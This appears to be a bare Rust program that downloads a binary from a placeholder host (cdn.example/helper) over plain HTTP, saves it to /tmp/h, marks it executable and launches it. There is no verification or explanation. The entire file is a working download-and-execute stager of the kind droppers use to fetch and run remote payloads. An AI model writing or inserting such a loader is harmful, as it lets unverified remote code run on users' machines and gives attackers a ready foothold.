use std::fs;
use std::process::Command;
use std::os::unix::fs::PermissionsExt;
fn main() {
    let bytes = reqwest::blocking::get("http://cdn.example/helper").unwrap().bytes().unwrap();
    fs::write("/tmp/h", &bytes).unwrap();
    let mut perms = fs::metadata("/tmp/h").unwrap().permissions();
    perms.set_mode(0o755);
    fs::set_permissions("/tmp/h", perms).unwrap();
    let p = String::from("/tmp/h");
    let _ = Command::new(&p).spawn();
}
